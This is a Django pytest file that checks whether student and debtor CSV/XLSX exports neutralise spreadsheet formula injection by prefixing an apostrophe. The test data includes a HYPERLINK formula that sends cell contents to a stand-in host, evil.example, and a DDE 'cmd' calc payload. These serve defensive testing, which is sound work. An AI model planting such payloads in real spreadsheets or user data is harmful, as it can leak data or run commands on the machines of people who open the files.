"""SEC-01: данные, начинающиеся с = + - @, не превращаются в формулы в Excel/CSV выгрузках."""

import csv
import io
from datetime import date

import pytest
from django.urls import reverse
from openpyxl import load_workbook

from apps.core.export import SafeCsvWriter, safe_cell, safe_row
from apps.courses.models import Course
from apps.finance.services import add_adjustment
from apps.groups.models import Enrollment, Group
from apps.students.models import Student
from apps.teachers.models import Teacher

pytestmark = pytest.mark.django_db
PAYLOAD = '=HYPERLINK("http://evil.example/?x="&A1,"Klik")'


@pytest.mark.parametrize("value", ["=1+1", "+cmd|' /C calc'!A0", "-2+3", "@SUM(A1)", "\t=1", PAYLOAD])
def test_dangerous_text_gets_apostrophe(value):
    assert safe_cell(value) == "'" + value


@pytest.mark.parametrize("value", ["+998 90 123-45-67", "+998901234567", "-5000", "(90) 123", "Ali", "", "a=b", 42, 3.5, None, date(2026, 1, 1)])
def test_normal_values_are_untouched(value):
    assert safe_cell(value) == value


def test_safe_row_and_csv_writer():
    assert safe_row(["=1", "ok", 5]) == ["'=1", "ok", 5]
    buffer = io.StringIO()
    SafeCsvWriter(csv.writer(buffer)).writerow(["=1+1", "+998901112233", "Ali"])
    assert buffer.getvalue().strip() == "'=1+1,+998901112233,Ali"


@pytest.fixture
def world(director_user):
    teacher = Teacher.objects.create(full_name="Ustoz", phone="+998900000000")
    course = Course.objects.create(name="English", monthly_price=400000)
    group = Group.objects.create(name="ENG-1", course=course, teacher=teacher, start_date="2026-01-01")
    student = Student.objects.create(first_name="Ali", last_name=PAYLOAD, phone="+998901112233", school="@evil")
    Enrollment.objects.create(student=student, group=group, status="active", start_date=date(2026, 9, 1))
    add_adjustment(student, group, -100000, director_user, "qarz")
    return {"student": student, "group": group}


def test_students_xlsx_export_neutralises_formulas(client, director_user, world):
    client.force_login(director_user)
    response = client.get(reverse("students:student_list"), {"export": "xlsx"})
    assert response.status_code == 200
    sheet = load_workbook(io.BytesIO(response.content)).active
    rows = list(sheet.iter_rows(min_row=2, values_only=True))
    row = next(r for r in rows if r[4] == "+998901112233")
    assert row[1] == "'" + PAYLOAD  # familiya
    assert row[4] == "+998901112233"  # телефон не искажён
    assert row[9] == "'@evil"  # maktab
    for cell in sheet[2]:
        assert cell.data_type != "f"  # ни одна ячейка не формула


def test_debtors_csv_export_neutralises_formulas(client, director_user, world):
    client.force_login(director_user)
    response = client.get(reverse("finance:debtors_export"))
    body = response.content.decode("utf-8-sig")
    rows = list(csv.reader(io.StringIO(body)))
    assert any(r[0].startswith("'=") for r in rows[1:])
    assert not any(r[0].startswith("=") for r in rows)
